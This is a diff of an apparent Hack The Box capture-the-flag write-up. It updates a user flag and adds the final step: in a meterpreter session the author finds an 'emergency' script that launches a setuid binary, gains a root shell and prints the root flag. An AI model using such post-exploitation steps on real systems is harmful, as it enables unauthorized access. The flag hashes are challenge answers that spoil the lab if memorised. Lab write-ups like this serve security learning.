@@ -626,7 +626,7 @@ Mode              Size  Type  Last modified              Name
 100444/r--r--r--  33    fil   2021-01-31 19:57:12 +0800  user.txt
 
 meterpreter > cat user.txt
-cf7e86220606b30342777eca247d9272
+45297b1116b94557e9af4033f4198615
 ```
 Now let's try to get our system flag.
 
@@ -688,4 +688,96 @@ We don't immediately see anything we could use to our untrained eye, but one doe
 
 Let's explore this file.
 ```
+meterpreter > cd /var/htb
+meterpreter > ls
+Listing: /var/htb
+=================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+40755/rwxr-xr-x   4096  dir   2021-01-11 20:18:58 +0800  bin
+100755/rwxr-xr-x  356   fil   2017-06-14 23:30:24 +0800  emergency
+
+meterpreter > cat emergency
+#!/usr/bin/python
+import os, sys
+
+def close():
+        print "Bye"
+        sys.exit()
+
+def getroot():
+        try:
+                print "Popping up root shell..";
+                os.system("/var/htb/bin/emergency")
+                close()
+        except:
+                sys.exit()
+
+q1 = raw_input("[!] Do you want to get a root shell? (THIS SCRIPT IS FOR EMERGENCY ONLY) [y/n]: ");
+
+if q1 == "y" or q1 == "yes":
+        getroot()
+else:
+        close()
 ```
+Ooh! This is probably quite unrealistic, but still we have learnt alot from this. Turns out if we executed this file, we would get root. 
+
+What are we waiting for?
+```
+meterpreter > pwd
+/var/htb/bin
+meterpreter > ls
+Listing: /var/htb/bin
+=====================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+104755/rwxr-xr-x  112204  fil   2017-06-14 23:27:12 +0800  emergency
+
+shell                            <-
+Process 1303 created.
+Channel 0 created.
+./emergency                      <-
+whoami 
+root
+ls                               <-
+emergency
+pwd                              <-
+/var/htb/bin
+cd ..                            <-
+cd ..                            <-
+cd ..                            <-
+pwd                              <-
+/
+ls                               <-
+bin
+boot
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+cd root                          <-
+ls                               <-
+root.txt
+cat root.txt                     <-
+81b1e99576f6e62c994f77bc747929bb
+```
+Bim-ba-da-boom, we got ze flag!
